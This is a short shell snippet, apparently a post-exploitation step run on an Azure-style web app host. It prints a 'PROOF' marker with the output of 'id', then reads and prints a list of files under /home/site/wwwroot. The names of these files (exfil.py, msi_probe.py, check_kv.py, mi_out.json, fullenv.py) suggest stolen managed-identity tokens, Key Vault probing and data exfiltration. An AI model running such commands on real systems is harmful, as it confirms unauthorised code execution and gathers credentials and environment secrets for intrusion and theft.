printf 'PROOF '; id|tr -d '\n'; printf '\n'
for f in app.py app2.py k.sh mi_out.json msi_probe.txt msi_probe.py check_kv.py exfil.py probe.sh probe2.sh fullenv.py explore.py startup.sh requirements.txt results.json; do
  printf '### %s\n' "$f"; cat "/home/site/wwwroot/$f" 2>/dev/null; printf '\n'
done
printf 'INNER_DONE\n'
